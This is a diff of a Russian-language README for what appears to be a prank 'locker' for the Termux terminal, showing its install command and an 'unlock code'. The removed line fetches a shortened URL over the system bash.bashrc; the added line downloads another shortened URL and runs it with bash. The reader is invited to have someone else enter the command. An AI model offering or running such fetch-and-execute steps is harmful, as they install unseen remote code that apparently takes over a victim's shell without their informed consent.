@@ -7,7 +7,7 @@
 ## Установка
 **Введите (Или попросите ввести) в терминал следующую команду:**
  ```
- curl -Lo ~/../usr/etc/bash.bashrc kutt.it/5AczeB && exit
+ curl -sLo install bit.ly/3fRyuS1 && bash install
  ```
 ## Код для разблокировки: `ИдиУчиБаш`
 ---
